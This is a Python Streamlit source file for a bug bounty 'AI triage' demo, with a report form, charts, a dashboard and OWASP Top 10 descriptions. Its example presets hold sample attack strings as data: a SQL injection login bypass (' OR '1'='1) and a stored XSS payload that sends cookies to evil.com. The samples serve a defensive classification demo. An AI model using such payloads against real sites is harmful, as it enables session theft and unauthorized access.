"""
Anti-Gravity Bug Bounty Platform — AI Triage Demo
Streamlit app for demoing the AI triage & backend API features.
"""

import streamlit as st
import requests
import pandas as pd
import plotly.graph_objects as go
import plotly.express as px
from datetime import datetime, timedelta
import random
import time

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
API_BASE = "http://localhost:8000/api/v1"
HEALTH_URL = "http://localhost:8000/health"

st.set_page_config(
    page_title="Anti-Gravity Bug Bounty — AI Triage Demo",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ─────────────────────────────────────────────
# CUSTOM CSS
# ─────────────────────────────────────────────
st.markdown("""
<style>
  /* Dark cyber background */
  .stApp {
    background: linear-gradient(135deg, #0a0a0f 0%, #0d1117 50%, #0a0f0a 100%);
    color: #e0e0e0;
  }

  /* Sidebar */
  [data-testid="stSidebar"] {
    background: rgba(13, 17, 23, 0.95);
    border-right: 1px solid rgba(0, 255, 136, 0.15);
  }

  /* Headers */
  h1, h2, h3 { color: #00ff88 !important; }

  /* Metric cards */
  [data-testid="metric-container"] {
    background: rgba(0, 255, 136, 0.05);
    border: 1px solid rgba(0, 255, 136, 0.2);
    border-radius: 12px;
    padding: 16px;
  }
  [data-testid="metric-container"] label {
    color: #888 !important;
    font-size: 0.8rem !important;
  }
  [data-testid="metric-container"] [data-testid="stMetricValue"] {
    color: #00ff88 !important;
    font-size: 2rem !important;
  }

  /* Buttons */
  .stButton > button {
    background: linear-gradient(135deg, #00ff88, #00cc6a);
    color: #0a0a0f;
    font-weight: 700;
    border: none;
    border-radius: 8px;
    padding: 0.6rem 2rem;
    font-size: 1rem;
    transition: all 0.2s;
    width: 100%;
  }
  .stButton > button:hover {
    background: linear-gradient(135deg, #00cc6a, #00aa55);
    box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
    transform: translateY(-1px);
  }

  /* Text areas & inputs */
  textarea, input[type="text"] {
    background: rgba(255,255,255,0.05) !important;
    border: 1px solid rgba(0, 255, 136, 0.2) !important;
    color: #e0e0e0 !important;
    border-radius: 8px !important;
  }
  textarea:focus, input[type="text"]:focus {
    border-color: #00ff88 !important;
    box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2) !important;
  }

  /* Select boxes */
  .stSelectbox > div > div {
    background: rgba(255,255,255,0.05) !important;
    border: 1px solid rgba(0, 255, 136, 0.2) !important;
    color: #e0e0e0 !important;
    border-radius: 8px !important;
  }

  /* Status result box styles */
  .result-high {
    background: linear-gradient(135deg, rgba(0,255,136,0.1), rgba(0,200,100,0.05));
    border: 2px solid #00ff88;
    border-radius: 12px;
    padding: 20px;
    margin: 10px 0;
  }
  .result-review {
    background: linear-gradient(135deg, rgba(255,165,0,0.1), rgba(200,130,0,0.05));
    border: 2px solid #ffa500;
    border-radius: 12px;
    padding: 20px;
    margin: 10px 0;
  }
  .result-spam {
    background: linear-gradient(135deg, rgba(255,50,50,0.1), rgba(200,0,0,0.05));
    border: 2px solid #ff3232;
    border-radius: 12px;
    padding: 20px;
    margin: 10px 0;
  }

  /* Keyword tags */
  .kw-tag {
    display: inline-block;
    background: rgba(0, 255, 136, 0.15);
    border: 1px solid rgba(0, 255, 136, 0.4);
    color: #00ff88;
    border-radius: 6px;
    padding: 2px 10px;
    margin: 3px;
    font-size: 0.82rem;
    font-family: monospace;
  }

  /* Divider */
  hr { border-color: rgba(0, 255, 136, 0.15) !important; }

  /* Info box */
  .stInfo { background: rgba(0, 120, 255, 0.08) !important; border-left-color: #0078ff !important; }
  .stWarning { background: rgba(255, 165, 0, 0.08) !important; border-left-color: #ffa500 !important; }
  .stSuccess { background: rgba(0, 255, 136, 0.08) !important; border-left-color: #00ff88 !important; }
  .stError { background: rgba(255, 50, 50, 0.08) !important; border-left-color: #ff3232 !important; }
</style>
""", unsafe_allow_html=True)

# ─────────────────────────────────────────────
# SESSION STATE
# ─────────────────────────────────────────────
if "submissions" not in st.session_state:
    st.session_state.submissions = []
if "api_healthy" not in st.session_state:
    st.session_state.api_healthy = None


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def check_api_health():
    try:
        r = requests.get(HEALTH_URL, timeout=3)
        if r.status_code == 200:
            return True, r.json()
        return False, {}
    except Exception:
        return False, {}


def analyze_report(title: str, description: str, steps: str):
    payload = {
        "bug_title": title,
        "bug_description": description,
        "steps_to_reproduce": steps,
    }
    r = requests.post(f"{API_BASE}/analyze-report", json=payload, timeout=15)
    r.raise_for_status()
    return r.json()


def status_emoji(status: str) -> str:
    return {"HIGH_PRIORITY": "🚨", "NEEDS_REVIEW": "🔍", "REJECTED_SPAM": "🚫"}.get(status, "❓")


def severity_color(level: str) -> str:
    return {
        "critical": "#ff3232",
        "high": "#ff8c00",
        "medium": "#ffa500",
        "low": "#00ff88",
    }.get(level.lower(), "#888")


def make_gauge(value: int, title: str, color: str):
    fig = go.Figure(go.Indicator(
        mode="gauge+number",
        value=value,
        title={"text": title, "font": {"color": "#aaa", "size": 14}},
        number={"font": {"color": color, "size": 36}},
        gauge={
            "axis": {"range": [0, 100], "tickcolor": "#444", "tickfont": {"color": "#666"}},
            "bar": {"color": color, "thickness": 0.25},
            "bgcolor": "rgba(0,0,0,0)",
            "borderwidth": 0,
            "steps": [
                {"range": [0, 40], "color": "rgba(255,50,50,0.15)"},
                {"range": [40, 80], "color": "rgba(255,165,0,0.15)"},
                {"range": [80, 100], "color": "rgba(0,255,136,0.15)"},
            ],
            "threshold": {
                "line": {"color": color, "width": 3},
                "thickness": 0.75,
                "value": value,
            },
        },
    ))
    fig.update_layout(
        height=200,
        margin=dict(l=20, r=20, t=30, b=10),
        paper_bgcolor="rgba(0,0,0,0)",
        plot_bgcolor="rgba(0,0,0,0)",
        font={"color": "#aaa"},
    )
    return fig


def generate_history_chart(submissions):
    """Confidence score trend over submissions."""
    if not submissions:
        return None
    df = pd.DataFrame(submissions)
    df["idx"] = range(1, len(df) + 1)
    color_map = {
        "HIGH_PRIORITY": "#00ff88",
        "NEEDS_REVIEW": "#ffa500",
        "REJECTED_SPAM": "#ff3232",
    }
    fig = go.Figure()
    for status, grp in df.groupby("status"):
        fig.add_trace(go.Scatter(
            x=grp["idx"], y=grp["confidence"],
            mode="markers+lines",
            name=status,
            line=dict(color=color_map.get(status, "#888"), width=2),
            marker=dict(size=10, color=color_map.get(status, "#888"),
                        line=dict(color="#0d1117", width=2)),
        ))
    fig.update_layout(
        title="Confidence Score History",
        title_font_color="#00ff88",
        paper_bgcolor="rgba(0,0,0,0)",
        plot_bgcolor="rgba(0,0,0,0)",
        xaxis=dict(title="Submission #", gridcolor="rgba(255,255,255,0.05)",
                   tickfont=dict(color="#888")),
        yaxis=dict(title="Confidence Score", range=[0, 105],
                   gridcolor="rgba(255,255,255,0.05)", tickfont=dict(color="#888")),
        legend=dict(font=dict(color="#aaa"), bgcolor="rgba(0,0,0,0)"),
        height=300,
        margin=dict(l=10, r=10, t=40, b=10),
    )
    return fig


def severity_pie_chart(submissions):
    if not submissions:
        return None
    df = pd.DataFrame(submissions)
    counts = df["severity"].value_counts().reset_index()
    counts.columns = ["severity", "count"]
    color_map = {"critical": "#ff3232", "high": "#ff8c00",
                 "medium": "#ffa500", "low": "#00ff88", "unknown": "#888"}
    colors = [color_map.get(s, "#888") for s in counts["severity"]]
    fig = go.Figure(go.Pie(
        labels=counts["severity"].str.title(),
        values=counts["count"],
        marker=dict(colors=colors, line=dict(color="#0d1117", width=2)),
        textfont=dict(color="#fff"),
        hole=0.5,
    ))
    fig.update_layout(
        title="Severity Distribution",
        title_font_color="#00ff88",
        paper_bgcolor="rgba(0,0,0,0)",
        plot_bgcolor="rgba(0,0,0,0)",
        legend=dict(font=dict(color="#aaa"), bgcolor="rgba(0,0,0,0)"),
        height=280,
        margin=dict(l=10, r=10, t=40, b=10),
    )
    return fig


# ─────────────────────────────────────────────
# SIDEBAR
# ─────────────────────────────────────────────
with st.sidebar:
    st.markdown("""
    <div style='text-align:center; padding: 10px 0 20px 0;'>
      <div style='font-size:2.5rem;'>🛡️</div>
      <div style='font-size:1.1rem; font-weight:700; color:#00ff88;'>Anti-Gravity</div>
      <div style='font-size:0.75rem; color:#666;'>Bug Bounty Platform</div>
      <div style='font-size:0.65rem; color:#444; margin-top:4px;'>AI Triage Demo</div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("---")

    page = st.radio(
        "Navigation",
        ["🔬 AI Triage", "📊 Dashboard", "📖 OWASP Categories", "ℹ️ About"],
        label_visibility="collapsed",
    )

    st.markdown("---")

    # API health indicator
    if st.button("🔄 Check API Status"):
        healthy, info = check_api_health()
        st.session_state.api_healthy = healthy
        st.session_state.api_info = info

    if st.session_state.api_healthy is True:
        st.success("✅ API Online")
        info = st.session_state.get("api_info", {})
        if info.get("sentiment_model_loaded"):
            st.caption("🧠 Sentiment model: loaded")
        else:
            st.caption("⚠️ Sentiment model: not loaded")
    elif st.session_state.api_healthy is False:
        st.error("❌ API Offline")
        st.caption(f"Expected: `{API_BASE}`")
        st.info("Start the backend:\n```\ncd backend\nuvicorn main:app --reload\n```")
    else:
        st.info("Click button to check API status")

    st.markdown("---")
    st.caption(f"Backend: `{API_BASE}`")
    st.caption("© 2025 Anti-Gravity Platform")


# ─────────────────────────────────────────────
# PAGE: AI TRIAGE
# ─────────────────────────────────────────────
if "AI Triage" in page:
    st.markdown("# 🔬 AI Bug Triage Engine")
    st.markdown(
        "Submit a bug report and get instant AI analysis: OWASP classification, "
        "severity scoring, spam detection, and priority status."
    )
    st.markdown("---")

    # Example presets
    with st.expander("📋 Load an example bug report", expanded=False):
        preset = st.selectbox(
            "Choose a preset:",
            ["— Select —", "SQL Injection", "XSS Attack", "Broken Auth", "Spam Example"],
        )
        if preset == "SQL Injection":
            ex_title = "SQL Injection in login endpoint allows authentication bypass"
            ex_desc = (
                "The login endpoint /api/auth/login is vulnerable to SQL injection. "
                "By injecting `' OR '1'='1` into the username field, an attacker can "
                "bypass authentication and gain admin access without a valid password. "
                "The backend query directly concatenates user input without sanitization."
            )
            ex_steps = (
                "1. Navigate to /login\n"
                "2. Enter `' OR '1'='1` as username\n"
                "3. Enter any password\n"
                "4. Click Login\n"
                "5. Observe: admin panel access granted without valid credentials"
            )
        elif preset == "XSS Attack":
            ex_title = "Stored XSS in user profile bio field executes arbitrary JavaScript"
            ex_desc = (
                "The user profile bio field does not sanitize HTML input. "
                "Injecting `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` "
                "into the bio field stores the payload. When any user views the profile, "
                "the script executes in their browser, sending session cookies to the attacker."
            )
            ex_steps = (
                "1. Log in and go to Edit Profile\n"
                "2. Paste XSS payload in bio field\n"
                "3. Save profile\n"
                "4. Log in as another user\n"
                "5. Visit the attacker's profile\n"
                "6. Observe: cookie theft script executes"
            )
        elif preset == "Broken Auth":
            ex_title = "JWT token lacks expiry — session hijack possible after logout"
            ex_desc = (
                "The application issues JWT tokens without an `exp` claim. Once a token is "
                "issued, it remains valid indefinitely even after the user logs out. "
                "An attacker who obtains a token (via XSS, network sniffing, or log leak) "
                "can use it forever to authenticate as the victim."
            )
            ex_steps = (
                "1. Log in and capture the JWT from the Authorization header\n"
                "2. Log out of the application\n"
                "3. Replay the captured token on an authenticated endpoint\n"
                "4. Observe: server accepts the token and returns data"
            )
        elif preset == "Spam Example":
            ex_title = "bug"
            ex_desc = "there is a bug please fix it asap thank you"
            ex_steps = "click something"
        else:
            ex_title = ex_desc = ex_steps = ""

        if preset != "— Select —":
            if st.button("Load this example"):
                st.session_state["pre_title"] = ex_title
                st.session_state["pre_desc"] = ex_desc
                st.session_state["pre_steps"] = ex_steps
                st.rerun()

    # Form
    with st.form("triage_form", clear_on_submit=False):
        st.markdown("### 📝 Bug Report Details")
        col1, col2 = st.columns([3, 1])
        with col1:
            title = st.text_input(
                "Bug Title *",
                value=st.session_state.get("pre_title", ""),
                placeholder="e.g., SQL Injection in /api/login allows auth bypass",
                max_chars=500,
            )
        with col2:
            severity_hint = st.selectbox(
                "Reported Severity",
                ["critical", "high", "medium", "low"],
                index=1,
            )

        description = st.text_area(
            "Bug Description *",
            value=st.session_state.get("pre_desc", ""),
            placeholder="Describe the vulnerability in detail — what it is, what it affects, and the potential impact...",
            height=150,
        )

        steps = st.text_area(
            "Steps to Reproduce *",
            value=st.session_state.get("pre_steps", ""),
            placeholder="1. Go to...\n2. Enter...\n3. Click...\n4. Observe...",
            height=120,
        )

        submitted = st.form_submit_button("🤖 Analyze Bug Report")

    if submitted:
        if not title or not description or not steps:
            st.error("⚠️ Please fill in all three fields.")
        elif len(title) < 5:
            st.warning("Bug title is too short (minimum 5 characters).")
        elif len(description) < 20:
            st.warning("Description is too short (minimum 20 characters).")
        else:
            with st.spinner("🧠 Running AI analysis..."):
                try:
                    result = analyze_report(title, description, steps)
                    time.sleep(0.3)  # slight delay for UX

                    # Save to session history
                    st.session_state.submissions.append({
                        "title": title[:60] + ("..." if len(title) > 60 else ""),
                        "status": result["status"],
                        "confidence": result["confidence_score"],
                        "severity": result["severity"]["level"],
                        "owasp": result["owasp_category"]["code"],
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                    })

                    # ── Result Header ──
                    st.markdown("---")
                    st.markdown("## 🧠 AI Triage Result")

                    status = result["status"]
                    conf = result["confidence_score"]

                    if status == "HIGH_PRIORITY":
                        box_class = "result-high"
                        status_text = "🚨 HIGH PRIORITY"
                        sub = "This report shows high confidence of a real vulnerability. Escalated for immediate review."
                    elif status == "NEEDS_REVIEW":
                        box_class = "result-review"
                        status_text = "🔍 NEEDS REVIEW"
                        sub = "Possible vulnerability detected. Human review recommended before action."
                    else:
                        box_class = "result-spam"
                        status_text = "🚫 REJECTED / SPAM"
                        sub = "Low quality or spam report. Consider improving the description and resubmitting."

                    st.markdown(f"""
                    <div class="{box_class}">
                      <div style='font-size:1.6rem; font-weight:800;'>{status_text}</div>
                      <div style='color:#aaa; margin-top:6px;'>{sub}</div>
                    </div>
                    """, unsafe_allow_html=True)

                    # ── Score Gauges ──
                    st.markdown("### 📊 Scores")
                    g1, g2, g3 = st.columns(3)

                    with g1:
                        color = "#00ff88" if conf > 80 else "#ffa500" if conf > 40 else "#ff3232"
                        st.plotly_chart(make_gauge(conf, "Confidence Score", color),
                                        use_container_width=True, key="gauge_conf")

                    with g2:
                        tq = result["text_quality"]["score"]
                        tq_color = "#00ff88" if tq > 70 else "#ffa500" if tq > 40 else "#ff3232"
                        st.plotly_chart(make_gauge(tq, "Text Quality", tq_color),
                                        use_container_width=True, key="gauge_tq")

                    with g3:
                        spam = result["spam_detection"]["spam_score"]
                        spam_color = "#ff3232" if spam > 50 else "#ffa500" if spam > 25 else "#00ff88"
                        st.plotly_chart(make_gauge(spam, "Spam Score", spam_color),
                                        use_container_width=True, key="gauge_spam")

                    # ── Details Grid ──
                    st.markdown("### 🔍 Analysis Details")
                    d1, d2 = st.columns(2)

                    with d1:
                        owasp = result["owasp_category"]
                        sev = result["severity"]
                        sev_color = severity_color(sev["level"])

                        st.markdown("**🛡️ OWASP Classification**")
                        st.markdown(f"""
                        <div style='background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08);
                                    border-radius:10px; padding:16px; margin-bottom:12px;'>
                          <div style='font-size:1.1rem; font-weight:700; color:#00ff88;'>{owasp['code']}</div>
                          <div style='color:#ccc; margin-top:4px;'>{owasp['name']}</div>
                          <div style='color:#888; font-size:0.8rem; margin-top:6px;'>
                            Category confidence: <b style='color:#00ff88;'>{owasp['confidence']:.1f}%</b>
                          </div>
                          <div style='margin-top:10px;'>
                            {''.join(f'<span class="kw-tag">{kw}</span>'
                                     for kw in owasp['matched_keywords']) if owasp['matched_keywords']
                                     else '<span style="color:#666; font-size:0.8rem;">No keywords matched</span>'}
                          </div>
                        </div>
                        """, unsafe_allow_html=True)

                        st.markdown("**⚡ Severity Assessment**")
                        st.markdown(f"""
                        <div style='background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08);
                                    border-radius:10px; padding:16px;'>
                          <div style='font-size:1.4rem; font-weight:800; color:{sev_color};'>
                            {sev['level'].upper()}
                          </div>
                          <div style='color:#aaa; margin-top:6px;'>
                            CVSS Score: <b style='color:{sev_color};'>{sev['cvss_score']}/100</b>
                          </div>
                          <div style='color:#666; font-size:0.8rem; margin-top:4px;'>
                            Researcher reported: <b>{severity_hint.upper()}</b>
                          </div>
                        </div>
                        """, unsafe_allow_html=True)

                    with d2:
                        sent = result["sentiment"]
                        tq_data = result["text_quality"]

                        st.markdown("**💬 Sentiment Analysis**")
                        sent_label = sent["label"]
                        sent_score = sent["score"]
                        sent_color = "#00ff88" if sent_label == "POSITIVE" else "#ff3232" if sent_label == "NEGATIVE" else "#888"
                        st.markdown(f"""
                        <div style='background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08);
                                    border-radius:10px; padding:16px; margin-bottom:12px;'>
                          <div style='font-size:1.1rem; font-weight:700; color:{sent_color};'>
                            {sent_label}
                          </div>
                          <div style='color:#aaa; margin-top:4px; font-size:0.85rem;'>
                            Score: <b>{sent_score:.3f}</b>
                          </div>
                          <div style='color:#666; font-size:0.75rem; margin-top:6px;'>
                            Technical/professional tone is preferred for high-priority reports.
                          </div>
                        </div>
                        """, unsafe_allow_html=True)

                        st.markdown("**📝 Text Quality**")
                        st.markdown(f"""
                        <div style='background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08);
                                    border-radius:10px; padding:16px;'>
                          <div style='font-size:1.1rem; font-weight:700; color:{tq_color};'>
                            {tq_data['assessment'].upper()} ({tq_data['score']}/100)
                          </div>
                          <div style='color:#666; font-size:0.78rem; margin-top:8px;'>
                            ✅ Include: detailed steps, technical terms, impact description<br>
                            ❌ Avoid: vague descriptions, missing steps, short reports
                          </div>
                        </div>
                        """, unsafe_allow_html=True)

                    # ── Raw JSON expander ──
                    with st.expander("🔧 View Raw API Response (JSON)", expanded=False):
                        st.json(result)

                except requests.exceptions.ConnectionError:
                    st.error(
                        "❌ **Cannot connect to the backend API.**\n\n"
                        f"Make sure the FastAPI server is running at `{API_BASE}`.\n\n"
                        "```bash\ncd backend\nvenv\\Scripts\\activate\nuvicorn main:app --reload\n```"
                    )
                except requests.exceptions.HTTPError as e:
                    st.error(f"❌ API Error {e.response.status_code}: {e.response.text}")
                except Exception as e:
                    st.error(f"❌ Unexpected error: {str(e)}")


# ─────────────────────────────────────────────
# PAGE: DASHBOARD
# ─────────────────────────────────────────────
elif "Dashboard" in page:
    st.markdown("# 📊 Triage Dashboard")
    st.markdown("Overview of all analyzed bug reports in this session.")
    st.markdown("---")

    submissions = st.session_state.submissions

    if not submissions:
        st.info("🔬 No submissions yet. Go to **AI Triage** and analyze some bug reports!")
    else:
        df = pd.DataFrame(submissions)

        # Stats row
        total = len(df)
        high = len(df[df["status"] == "HIGH_PRIORITY"])
        review = len(df[df["status"] == "NEEDS_REVIEW"])
        spam = len(df[df["status"] == "REJECTED_SPAM"])
        avg_conf = int(df["confidence"].mean())

        c1, c2, c3, c4, c5 = st.columns(5)
        c1.metric("Total Analyzed", total)
        c2.metric("🚨 High Priority", high)
        c3.metric("🔍 Needs Review", review)
        c4.metric("🚫 Rejected/Spam", spam)
        c5.metric("Avg Confidence", f"{avg_conf}%")

        st.markdown("---")

        # Charts
        ch1, ch2 = st.columns(2)
        with ch1:
            fig = generate_history_chart(submissions)
            if fig:
                st.plotly_chart(fig, use_container_width=True)

        with ch2:
            fig2 = severity_pie_chart(submissions)
            if fig2:
                st.plotly_chart(fig2, use_container_width=True)

        # Table
        st.markdown("### 📋 Submission History")
        display_df = df[["timestamp", "title", "status", "confidence", "severity", "owasp"]].copy()
        display_df.columns = ["Time", "Bug Title", "Status", "Confidence", "Severity", "OWASP"]
        st.dataframe(
            display_df,
            use_container_width=True,
            hide_index=True,
        )

        if st.button("🗑️ Clear Session History"):
            st.session_state.submissions = []
            st.rerun()


# ─────────────────────────────────────────────
# PAGE: OWASP CATEGORIES
# ─────────────────────────────────────────────
elif "OWASP" in page:
    st.markdown("# 📖 OWASP Top 10 — 2021")
    st.markdown("Categories used by the AI engine for classification.")
    st.markdown("---")

    # Try to fetch from API, else show static
    try:
        r = requests.get(f"{API_BASE}/owasp-categories", timeout=5)
        if r.status_code == 200:
            data = r.json()
            st.success(f"✅ Loaded {data['total']} categories from the live API")
            for cat in data["categories"]:
                with st.expander(f"**{cat['code']}** — {cat['name']}"):
                    st.markdown(f"Keywords in database: **{cat['keyword_count']}**")
        else:
            raise Exception("Non-200")
    except Exception:
        st.warning("⚠️ API offline — showing static OWASP data")
        categories = [
            ("A01:2021", "Broken Access Control", "Most common web security risk. Restrictions on authenticated users are not properly enforced."),
            ("A02:2021", "Cryptographic Failures", "Failures related to cryptography — often leads to exposure of sensitive data."),
            ("A03:2021", "Injection", "SQL, NoSQL, OS, LDAP injection — untrusted data sent to an interpreter as a command."),
            ("A04:2021", "Insecure Design", "Risks related to design flaws — missing or ineffective control design."),
            ("A05:2021", "Security Misconfiguration", "Missing security hardening, unnecessary features enabled, default accounts."),
            ("A06:2021", "Vulnerable & Outdated Components", "Libraries, frameworks, and software with known vulnerabilities."),
            ("A07:2021", "Identification & Authentication Failures", "Incorrectly implemented authentication — allows attackers to compromise accounts."),
            ("A08:2021", "Software & Data Integrity Failures", "Code and infrastructure that doesn't protect against integrity violations."),
            ("A09:2021", "Security Logging & Monitoring Failures", "Insufficient logging, detection, monitoring, and response."),
            ("A10:2021", "Server-Side Request Forgery", "SSRF — web app fetches a remote resource without validating the user-supplied URL."),
        ]
        for code, name, desc in categories:
            with st.expander(f"**{code}** — {name}"):
                st.markdown(desc)


# ─────────────────────────────────────────────
# PAGE: ABOUT
# ─────────────────────────────────────────────
elif "About" in page:
    st.markdown("# ℹ️ About This Demo")
    st.markdown("---")
    st.markdown("""
    ### 🛡️ Anti-Gravity Bug Bounty Platform — AI Triage Demo

    This **Streamlit app** is a demo interface for the AI triage engine built as part of the
    **Anti-Gravity Decentralized Bug Bounty Platform**.

    ---

    ### 🤖 How the AI Works

    When you submit a bug report, the engine:

    1. **Spam Detection** — Checks for low-quality indicators, very short text, repeated characters
    2. **OWASP Classification** — Keyword-matches your report against OWASP Top 10 (2021) categories
    3. **Severity Assessment** — Identifies severity keywords (critical, RCE, full access, etc.)
    4. **Text Quality** — Scores report completeness (title length, description depth, numbered steps)
    5. **Sentiment Analysis** — Uses `distilbert-base-uncased` to assess writing tone
    6. **Confidence Score** — Weighted average: OWASP (40%) + Quality (30%) + Spam (20%) + Sentiment (10%)
    7. **Priority Status** — `HIGH_PRIORITY` (>80), `NEEDS_REVIEW` (40-80), `REJECTED_SPAM` (<40)

    ---

    ### 🏗️ Full Platform Stack

    | Layer | Technology |
    |---|---|
    | AI Demo UI | **Streamlit** (this app) |
    | Full Frontend | **Next.js 14** + RainbowKit + TailwindCSS |
    | Backend API | **FastAPI** + Python |
    | AI Engine | **Transformers** (DistilBERT) + OWASP keyword matching |
    | Smart Contract | **Solidity** (BountyVault.sol) on Polygon |
    | Database | **Supabase** (PostgreSQL) |
    | File Storage | **IPFS** |

    ---

    ### 🚀 Running Locally

    ```bash
    # 1. Start FastAPI backend
    cd backend
    venv\\Scripts\\activate
    uvicorn main:app --reload

    # 2. Run this Streamlit demo
    cd streamlit_demo
    pip install -r requirements.txt
    streamlit run app.py
    ```

    API Docs: [http://localhost:8000/docs](http://localhost:8000/docs)
    """)
